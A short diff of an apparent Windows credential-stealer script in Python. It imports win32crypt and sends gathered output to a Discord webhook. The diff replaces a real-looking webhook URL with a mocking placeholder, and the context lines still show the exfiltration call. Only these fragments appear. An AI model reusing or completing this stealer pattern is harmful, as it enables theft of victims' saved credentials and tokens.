@@ -15,7 +15,7 @@ import win32crypt
 
 # remove the example webhook in between "webhook" with your own
 
-webhook = "https://discord.com/api/webhooks/1480196713338896598/Wx4s0-1bdUbRkkBxASMrDVFlbyq7KQsZPNGos5DjEPiSSwgLIsldn8sH6Qlcj7lGTA7_"
+webhook = "put your token here fcking skid lol"
 
 
 
@@ -354,3 +354,4 @@ if finaloutput.strip() == "":
     sendToDiscord("nothing found lol")
 else:
     sendToDiscord(finaloutput)
+
